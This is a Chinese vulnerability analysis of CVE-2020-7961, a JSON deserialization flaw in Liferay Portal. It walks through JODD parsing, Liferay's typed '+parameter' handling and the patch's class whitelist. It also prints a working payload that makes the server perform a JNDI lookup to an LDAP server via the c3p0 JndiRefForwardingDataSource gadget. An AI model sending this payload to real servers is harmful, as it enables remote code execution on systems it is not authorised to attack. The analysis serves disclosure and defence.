# Liferay Portal Json Web Service 反序列化漏洞(CVE-2020-7961)

阅读量 **565297**

发布时间 : 2020-04-01 14:30:41

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t0160db5adc3e2aac6a.png)

**作者：Longofo@知道创宇404实验室**

之前在CODE WHITE上发布了一篇关于[Liferay Portal JSON Web Service
RCE](https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html)的漏洞，之前是小伙伴在处理这个漏洞，后面自己也去看了。Liferay Portal对于JSON Web
Service的处理，在6.1、6.2版本中使用的是[Flexjson库](http://flexjson.sourceforge.net/)，在7版本之后换成了[Jodd
Json](https://jodd.org/json/)。

**总结起来该漏洞就是：Liferay Portal提供了Json Web
Service服务，对于某些可以调用的端点，如果某个方法提供的是Object参数类型，那么就能够构造符合Java
Beans的可利用恶意类，传递构造好的json反序列化串，Liferay反序列化时会自动调用恶意类的setter方法以及默认构造方法**
。不过还有一些细节问题，感觉还挺有意思，作者文中那张向上查找图，想着idea也没提供这样方便的功能，应该是自己实现的查找工具，文中分析下Liferay使用JODD反序列化的情况。

## JODD序列化与反序列化

参考[官方使用手册](https://jodd.org/json/)，先看下JODD的直接序列化与反序列化：

TestObject.java

    
    
    package com.longofo;
    
    import java.util.HashMap;
    
    public class TestObject {
        private String name;
        private Object object;
        private HashMap<String, String> hashMap;
    
        public TestObject() {
            System.out.println("TestObject default constractor call");
        }
    
        public String getName() {
            System.out.println("TestObject getName call");
            return name;
        }
    
        public void setName(String name) {
            System.out.println("TestObject setName call");
            this.name = name;
        }
    
        public Object getObject() {
            System.out.println("TestObject getObject call");
            return object;
        }
    
        public void setObject(Object object) {
            System.out.println("TestObject setObject call");
            this.object = object;
        }
    
        public HashMap<String, String> getHashMap() {
            System.out.println("TestObject getHashMap call");
            return hashMap;
        }
    
        public void setHashMap(HashMap<String, String> hashMap) {
            System.out.println("TestObject setHashMap call");
            this.hashMap = hashMap;
        }
    
        @Override
        public String toString() {
            return "TestObject{" +
                    "name='" + name + '\'' +
                    ", object=" + object +
                    ", hashMap=" + hashMap +
                    '}';
        }
    }

TestObject1.java

    
    
    package com.longofo;
    
    public class TestObject1 {
        private String jndiName;
    
        public TestObject1() {
            System.out.println("TestObject1 default constractor call");
        }
    
        public String getJndiName() {
            System.out.println("TestObject1 getJndiName call");
            return jndiName;
        }
    
        public void setJndiName(String jndiName) {
            System.out.println("TestObject1 setJndiName call");
            this.jndiName = jndiName;
    //        Context context = new InitialContext();
    //        context.lookup(jndiName);
        }
    }

Test.java

    
    
    package com.longofo;
    
    import jodd.json.JsonParser;
    import jodd.json.JsonSerializer;
    
    import java.util.HashMap;
    
    public class Test {
        public static void main(String[] args) {
            System.out.println("test common usage");
            test1Common();
    
            System.out.println();
            System.out.println();
    
            System.out.println("test unsecurity usage");
            test2Unsecurity();
        }
    
        public static void test1Common() {
            TestObject1 testObject1 = new TestObject1();
            testObject1.setJndiName("xxx");
    
            HashMap hashMap = new HashMap<String, String>();
            hashMap.put("aaa", "bbb");
    
            TestObject testObject = new TestObject();
            testObject.setName("ccc");
            testObject.setObject(testObject1);
            testObject.setHashMap(hashMap);
    
            JsonSerializer jsonSerializer = new JsonSerializer();
            String json = jsonSerializer.deep(true).serialize(testObject);
            System.out.println(json);
            System.out.println("----------------------------------------");
    
            JsonParser jsonParser = new JsonParser();
            TestObject dtestObject = jsonParser.map("object", TestObject1.class).parse(json, TestObject.class);
            System.out.println(dtestObject);
        }
    
        public static void test2Unsecurity() {
            TestObject1 testObject1 = new TestObject1();
            testObject1.setJndiName("xxx");
    
            HashMap hashMap = new HashMap<String, String>();
            hashMap.put("aaa", "bbb");
    
            TestObject testObject = new TestObject();
            testObject.setName("ccc");
            testObject.setObject(testObject1);
            testObject.setHashMap(hashMap);
    
            JsonSerializer jsonSerializer = new JsonSerializer();
            String json = jsonSerializer.setClassMetadataName("class").deep(true).serialize(testObject);
            System.out.println(json);
            System.out.println("----------------------------------------");
    
            JsonParser jsonParser = new JsonParser();
            TestObject dtestObject = jsonParser.setClassMetadataName("class").parse(json);
            System.out.println(dtestObject);
        }
    }

输出：

    
    
    test common usage
    TestObject1 default constractor call
    TestObject1 setJndiName call
    TestObject default constractor call
    TestObject setName call
    TestObject setObject call
    TestObject setHashMap call
    TestObject getHashMap call
    TestObject getName call
    TestObject getObject call
    TestObject1 getJndiName call
    {"hashMap":{"aaa":"bbb"},"name":"ccc","object":{"jndiName":"xxx"}}
    ----------------------------------------    TestObject default constractor call
    TestObject setHashMap call
    TestObject setName call
    TestObject1 default constractor call
    TestObject1 setJndiName call
    TestObject setObject call
    TestObject{name='ccc', object=com.longofo.TestObject1@6fdb1f78, hashMap={aaa=bbb}}
    
    
    test unsecurity usage
    TestObject1 default constractor call
    TestObject1 setJndiName call
    TestObject default constractor call
    TestObject setName call
    TestObject setObject call
    TestObject setHashMap call
    TestObject getHashMap call
    TestObject getName call
    TestObject getObject call
    TestObject1 getJndiName call
    {"class":"com.longofo.TestObject","hashMap":{"aaa":"bbb"},"name":"ccc","object":{"class":"com.longofo.TestObject1","jndiName":"xxx"}}
    ----------------------------------------    TestObject1 default constractor call
    TestObject1 setJndiName call
    TestObject default constractor call
    TestObject setHashMap call
    TestObject setName call
    TestObject setObject call
    TestObject{name='ccc', object=com.longofo.TestObject1@65e579dc, hashMap={aaa=bbb}}

在Test.java中，使用了两种方式，第一种是常用的使用方式，在反序列化时指定根类型（rootType）；而第二种官方也不推荐这样使用，存在安全问题，假设某个应用提供了接收JODD
Json的地方，并且使用了第二种方式，那么就可以任意指定类型进行反序列化了，不过Liferay这个漏洞给并不是这个原因造成的，它并没有使用setClassMetadataName(“class”)这种方式。

## Liferay对JODD的包装

Liferay没有直接使用JODD进行处理，而是重新包装了JODD一些功能。代码不长，所以下面分别分析下Liferay对JODD的JsonSerializer与JsonParser的包装。

### JSONSerializerImpl

Liferay对JODD JsonSerializer的包装是`com.liferay.portal.json.JSONSerializerImpl`类：

    
    
    public class JSONSerializerImpl implements JSONSerializer {
        private final JsonSerializer _jsonSerializer;//JODD的JsonSerializer，最后还是交给了JODD的JsonSerializer去处理，只不过包装了一些额外的设置
    
        public JSONSerializerImpl() {
            if (JavaDetector.isIBM()) {//探测JDK
                SystemUtil.disableUnsafeUsage();//和Unsafe类的使用有关
            }
    
            this._jsonSerializer = new JsonSerializer();
        }
    
        public JSONSerializerImpl exclude(String... fields) {
            this._jsonSerializer.exclude(fields);//排除某个field不序列化
            return this;
        }
    
        public JSONSerializerImpl include(String... fields) {
            this._jsonSerializer.include(fields);//包含某个field进行序列化
            return this;
        }
    
        public String serialize(Object target) {
            return this._jsonSerializer.serialize(target);//调用JODD的JsonSerializer进行序列化
        }
    
        public String serializeDeep(Object target) {
            JsonSerializer jsonSerializer = this._jsonSerializer.deep(true);//设置了deep后能序列化任意类型的field，包括集合等类型
            return jsonSerializer.serialize(target);
        }
    
        public JSONSerializerImpl transform(JSONTransformer jsonTransformer, Class<?> type) {//设置转换器，和下面的设置全局转换器类似，不过这里可以传入自定义的转换器（比如将某个类的Data field，格式为03/27/2020，序列化时转为2020-03-27）
            TypeJsonSerializer<?> typeJsonSerializer = null;
            if (jsonTransformer instanceof TypeJsonSerializer) {
                typeJsonSerializer = (TypeJsonSerializer)jsonTransformer;
            } else {
                typeJsonSerializer = new JoddJsonTransformer(jsonTransformer);
            }
    
            this._jsonSerializer.use(type, (TypeJsonSerializer)typeJsonSerializer);
            return this;
        }
    
        public JSONSerializerImpl transform(JSONTransformer jsonTransformer, String field) {
            TypeJsonSerializer<?> typeJsonSerializer = null;
            if (jsonTransformer instanceof TypeJsonSerializer) {
                typeJsonSerializer = (TypeJsonSerializer)jsonTransformer;
            } else {
                typeJsonSerializer = new JoddJsonTransformer(jsonTransformer);
            }
    
            this._jsonSerializer.use(field, (TypeJsonSerializer)typeJsonSerializer);
            return this;
        }
    
        static {
            //全局注册，对于所有Array、Object、Long类型的数据，在序列化时都进行转换单独的转换处理
            JoddJson.defaultSerializers.register(JSONArray.class, new JSONSerializerImpl.JSONArrayTypeJSONSerializer());
            JoddJson.defaultSerializers.register(JSONObject.class, new JSONSerializerImpl.JSONObjectTypeJSONSerializer());
            JoddJson.defaultSerializers.register(Long.TYPE, new JSONSerializerImpl.LongToStringTypeJSONSerializer());
            JoddJson.defaultSerializers.register(Long.class, new JSONSerializerImpl.LongToStringTypeJSONSerializer());
        }
    
        private static class LongToStringTypeJSONSerializer implements TypeJsonSerializer<Long> {
            private LongToStringTypeJSONSerializer() {
            }
    
            public void serialize(JsonContext jsonContext, Long value) {
                jsonContext.writeString(String.valueOf(value));
            }
        }
    
        private static class JSONObjectTypeJSONSerializer implements TypeJsonSerializer<JSONObject> {
            private JSONObjectTypeJSONSerializer() {
            }
    
            public void serialize(JsonContext jsonContext, JSONObject jsonObject) {
                jsonContext.write(jsonObject.toString());
            }
        }
    
        private static class JSONArrayTypeJSONSerializer implements TypeJsonSerializer<JSONArray> {
            private JSONArrayTypeJSONSerializer() {
            }
    
            public void serialize(JsonContext jsonContext, JSONArray jsonArray) {
                jsonContext.write(jsonArray.toString());
            }
        }
    }

能看出就是设置了JODD JsonSerializer在序列化时的一些功能。

### JSONDeserializerImpl

Liferay对JODD JsonParser的包装是`com.liferay.portal.json.JSONDeserializerImpl`类：

    
    
    public class JSONDeserializerImpl<T> implements JSONDeserializer<T> {
        private final JsonParser _jsonDeserializer;//JsonParser，反序列化最后还是交给了JODD的JsonParser去处理，JSONDeserializerImpl包装了一些额外的设置
    
        public JSONDeserializerImpl() {
            if (JavaDetector.isIBM()) {//探测JDK
                SystemUtil.disableUnsafeUsage();//和Unsafe类的使用有关
            }
    
            this._jsonDeserializer = new PortalJsonParser();
        }
    
        public T deserialize(String input) {
            return this._jsonDeserializer.parse(input);//调用JODD的JsonParser进行反序列化
        }
    
        public T deserialize(String input, Class<T> targetType) {
            return this._jsonDeserializer.parse(input, targetType);//调用JODD的JsonParser进行反序列化，可以指定根类型（rootType）
        }
    
        public <K, V> JSONDeserializer<T> transform(JSONDeserializerTransformer<K, V> jsonDeserializerTransformer, String field) {//反序列化时使用的转换器
            ValueConverter<K, V> valueConverter = new JoddJsonDeserializerTransformer(jsonDeserializerTransformer);
            this._jsonDeserializer.use(field, valueConverter);
            return this;
        }
    
        public JSONDeserializer<T> use(String path, Class<?> clazz) {
            this._jsonDeserializer.map(path, clazz);//为某个field指定具体的类型，例如file在某个类是接口或Object等类型，在反序列化时指定具体的
            return this;
        }
    }

能看出也是设置了JODD JsonParser在反序列化时的一些功能。

## Liferay 漏洞分析

Liferay在`/api/jsonws`API提供了几百个可以调用的Webservice，负责处理的该API的Servlet也直接在web.xml中进行了配置：

![](https://p2.ssl.qhimg.com/t01585f2b31de66eac9.png)

![](https://p0.ssl.qhimg.com/t01a3aa073db0ff6634.png)

随意点一个方法看看：

![](https://p3.ssl.qhimg.com/t01f5bf5cab52764b26.png)

看到这个有点感觉了，可以传递参数进行方法调用，有个p_auth是用来验证的，不过反序列化在验证之前，所以那个值对漏洞利用没影响。根据CODE
WHITE那篇分析，是存在参数类型为Object的方法参数的，那么猜测可能可以传入任意类型的类。可以先正常的抓包调用去调试下，这里就不写正常的调用调试过程了，简单看一下post参数：

    
    
    cmd={"/announcementsdelivery/update-delivery":{}}&p_auth=cqUjvUKs&formDate=1585293659009&userId=11&type=11&email=true&sms=true

总的来说就是 **Liferay先查找**` **/announcementsdelivery/update-delivery**` **对应的方法->其他post参数参都是方法的参数->当每个参数对象类型与与目标方法参数类型一致时->恢复参数对象->利用反射调用该方法**。

但是抓包并没有类型指定，因为大多数类型是String、long、int、List、map等类型，JODD反序列化时会自动处理。但是对于某些接口/Object类型的field，如果要指定具体的类型，该怎么指定？

作者文中提到，Liferay Portal 7中只能显示指定rootType进行调用，从上面Liferay对JODD
JSONDeserializerImpl包装来看也是这样。如果要恢复某个方法参数是Object类型时具体的对象，那么Liferay本身可能会先对数据进行解析，获取到指定的类型，然后调用JODD的parse(path,class)方法，传递解析出的具体类型来恢复这个参数对象；也有可能Liferay并没有这样做。不过从作者的分析中可以看出，Liferay确实这样做了。作者查找了`jodd.json.Parser#rootType`的调用图（羡慕这样的工具）：

![](https://p3.ssl.qhimg.com/t01860fac74e3031279.png)

通过向上查找的方式，作者找到了可能存在能指定根类型的地方，在`com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#JSONWebServiceActionImpl`调用了`com.liferay.portal.kernel.JSONFactoryUtil#looseDeserialize(valueString,
parameterType)`,
looseDeserialize调用的是JSONSerializerImpl，JSONSerializerImpl调用的是`JODD的JsonParse.parse`。

`com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#JSONWebServiceActionImpl`再往上的调用就是Liferay解析Web
Service参数的过程了。它的上一层`JSONWebServiceActionImpl#_prepareParameters(Class<?>)`，JSONWebServiceActionImpl类有个`_jsonWebServiceActionParameters`属性：

![](https://p4.ssl.qhimg.com/t01d48538c75537ca29.png)

这个属性中又保存着一个`JSONWebServiceActionParametersMap`，在它的put方法中，当参数以`+`开头时，它的put方法以`:`分割了传递的参数,`:`之前是参数名,`:`之后是类型名。

![](https://p2.ssl.qhimg.com/t016c80f1085e2a4c27.png)

而put解析的操作在`com.liferay.portal.jsonwebservice.action.JSONWebServiceInvokerAction#_executeStatement`中完成：

![](https://p3.ssl.qhimg.com/t018669f46959694fe4.png)

通过上面的分析与作者的文章，我们能知道以下几点：

  1. Liferay 允许我们通过/api/jsonws/xxx调用Web Service方法
  2. 参数可以以+开头，用`:`指定参数类型
  3. JODD JsonParse会调用类的默认构造方法，以及field对应的setter方法

所以需要找在setter方法中或默认构造方法中存在恶意操作的类。去看下marshalsec已经提供的利用链，可以直接找Jackson、带Yaml的，看他们继承的利用链，大多数也适合这个漏洞，同时也要看在Liferay中是否存在才能用。这里用`com.mchange.v2.c3p0.JndiRefForwardingDataSource`这个测试，用`/expandocolumn/add-column`这个Service，因为他有`java.lang.Object`参数：

![](https://p1.ssl.qhimg.com/t0136190d0dd53448aa.png)

Payload如下：

    
    
    cmd={"/expandocolumn/add-column":{}}&p_auth=Gyr2NhlX&formDate=1585307550388&tableId=1&name=1&type=1&+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={"jndiName":"ldap://127.0.0.1:1389/Object","loginTimeout":0}

![](https://p2.ssl.qhimg.com/t01fa7d5749ecf021ab.png)

解析出了参数类型，并进行参数对象反序列化，最后到达了jndi查询：

![](https://p3.ssl.qhimg.com/t01b153b1b27bb5bb00.png)

####

## 补丁分析

Liferay补丁增加了类型校验，在`com.liferay.portal.jsonwebservice.JSONWebServiceActionImpl#_checkTypeIsAssignable`中：

![](https://p2.ssl.qhimg.com/t01c39912c975b1be84.png)

    
    
    private void _checkTypeIsAssignable(int argumentPos, Class<?> targetClass, Class<?> parameterType) {
            String parameterTypeName = parameterType.getName();
            if (parameterTypeName.contains("com.liferay") && parameterTypeName.contains("Util")) {//含有com.liferay与Util非法
                throw new IllegalArgumentException("Not instantiating " + parameterTypeName);
            } else if (!Objects.equals(targetClass, parameterType)) {//targetClass与parameterType不匹配时进入下一层校验
                if (!ReflectUtil.isTypeOf(parameterType, targetClass)) {//parameterType是否是targetClass的子类
                    throw new IllegalArgumentException(StringBundler.concat(new Object[]{"Unmatched argument type ", parameterTypeName, " for method argument ", argumentPos}));
                } else if (!parameterType.isPrimitive()) {//parameterType不是基本类型是进入下一层校验
                    if (!parameterTypeName.equals(this._jsonWebServiceNaming.convertModelClassToImplClassName(targetClass))) {//注解校验
                        if (!ArrayUtil.contains(_JSONWS_WEB_SERVICE_PARAMETER_TYPE_WHITELIST_CLASS_NAMES, parameterTypeName)) {//白名单校验，白名单类在_JSONWS_WEB_SERVICE_PARAMETER_TYPE_WHITELIST_CLASS_NAMES中
                            ServiceReference<Object>[] serviceReferences = _serviceTracker.getServiceReferences();
                            if (serviceReferences != null) {
                                String key = "jsonws.web.service.parameter.type.whitelist.class.names";
                                ServiceReference[] var7 = serviceReferences;
                                int var8 = serviceReferences.length;
    
                                for(int var9 = 0; var9 < var8; ++var9) {
                                    ServiceReference<Object> serviceReference = var7[var9];
                                    List<String> whitelistedClassNames = StringPlus.asList(serviceReference.getProperty(key));
                                    if (whitelistedClassNames.contains(parameterTypeName)) {
                                        return;
                                    }
                                }
                            }
    
                            throw new TypeConversionException(parameterTypeName + " is not allowed to be instantiated");
                        }
                    }
                }
            }
        }

`_JSONWS_WEB_SERVICE_PARAMETER_TYPE_WHITELIST_CLASS_NAMES`所有白名单类在portal.properties中，有点长就不列出来了，基本都是以`com.liferay`开头的类。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **知道创宇404实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/202209](/post/id/202209)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t016a18426d2b84e450.png) 知道创宇404实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

